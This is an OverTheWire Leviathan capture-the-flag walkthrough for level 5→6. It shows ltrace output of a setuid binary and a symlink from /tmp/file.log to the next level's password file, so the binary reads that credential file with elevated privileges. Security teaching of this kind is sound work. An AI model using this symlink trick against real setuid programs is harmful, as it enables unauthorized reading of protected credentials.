> **Level Goal:** There is no information for this level, intentionally. Figure it out yourself.

---

## Connection Details

| Field    | Value                                                   |
| -------- | ------------------------------------------------------- |
| Host     | `leviathan.labs.overthewire.org`                        |
| Port     | `2223`                                                  |
| Username | `leviathan5`                                            |
| Password | *[Leviathan Level 4 → 5](leviathan-level-4-level-5.md)* |

---

## Commands Used

- `ls -la` — List all files including hidden, with permissions and ownership
- `ltrace` — Trace library calls made by a running program
- `ln -s` — Create a symbolic link
- `touch` — Create an empty file

> **Reference:** [ltrace man page](https://man7.org/linux/man-pages/man1/ltrace.1.html) · [fopen man page](https://man7.org/linux/man-pages/man3/fopen.3.html) · [ln man page](https://man7.org/linux/man-pages/man1/ln.1.html)

---

## Solution

### Step 1 — Connect to the Server

```bash
ssh leviathan5@leviathan.labs.overthewire.org -p 2223
```

---

### Step 2 — Survey the Home Directory

```bash
leviathan5@leviathan:~$ ls -la
```

Output:

```
-r-sr-x---   1 leviathan6 leviathan5 15148 Apr  3 15:19 leviathan5
```

A setuid binary called `leviathan5`, owned by `leviathan6`.

---

### Step 3 — Run the Binary

```bash
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
```

It exits immediately with an error. No prompt, no argument required. The binary is looking for a specific hardcoded file path and failing because it doesn't exist.

---

### Step 4 — Trace the Binary with `ltrace`

```bash
leviathan5@leviathan:~$ ltrace ./leviathan5
```

Output:

```
__libc_start_main(0x804910d, 1, 0xffffd464, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                      = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                = 26
exit(-1 <no return ...>
+++ exited (status 255) +++

```

The binary calls `fopen` on `/tmp/file.log` in read mode. `fopen` returns `0` (NULL) because the file doesn't exist, and the binary immediately exits. If the file existed and contained text, the binary would print its contents — under `leviathan6` privileges because of the setuid bit.

---

### Understand `fopen` and the Attack Surface

> `fopen(path, "r")` opens a file at the given path for reading. It uses the **effective user ID** of the process, not the real user ID, so when the setuid binary calls it, the file is opened as `leviathan6`. The binary doesn't validate what `path` actually points to. If `/tmp/file.log` is a symbolic link, `fopen` will transparently follow it and open whatever the link targets, still under `leviathan6` privileges. This is the same symlink primitive used in level 2→3, applied differently: instead of hijacking a filename passed as an argument, we're controlling a hardcoded path the binary always opens.

|Scenario|What `fopen` opens|
|---|---|
|`/tmp/file.log` is a regular file|That file, read as `leviathan6`|
|`/tmp/file.log` doesn't exist|Returns NULL, binary exits|
|`/tmp/file.log` is a symlink|The symlink target, read as `leviathan6`|

---

### Step 5 — Verify the Binary Prints File Contents

Before setting up the symlink, confirm the binary behaves as expected by creating a plain file with known content:

```bash
leviathan5@leviathan:~$ touch /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
```

No output, the file exists but is empty. The binary opens and reads it without error. The plumbing works.

---

### Step 6 — Replace the File with a Symlink

Remove the empty file and create a symlink at the same path pointing to the `leviathan6` password file:

```bash
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
```

`ln -s <target> <link>` creates a symbolic link named `/tmp/file.log` pointing to the password file. The binary will call `fopen("/tmp/file.log", "r")`, follow the link, and open the password file under `leviathan6` privileges.

---

### Step 7 — Execute the Attack

```bash
leviathan5@leviathan:~$ ./leviathan5
```

Output:

```
<password for leviathan6>
```

The password is for [Leviathan Level 6 → 7](leviathan-level-6-level-7.md).

---

## Key Takeaways

- **A hardcoded path a setuid binary opens is an attack surface.** If any part of that path is attacker-controllable, whether by writing to `/tmp`, creating files in a world-writable directory, or racing a file creation, a symlink can redirect the open to any target the binary's effective user can read.
- **`fopen` follows symlinks silently.** Unlike some system calls that can be instructed to reject symlinks, the standard C `fopen` has no such flag. When a program calls `fopen(path, "r")`, it will follow any symlink chain at `path` without any indication in the return value. This makes it a reliable primitive for symlink attacks against setuid binaries.

---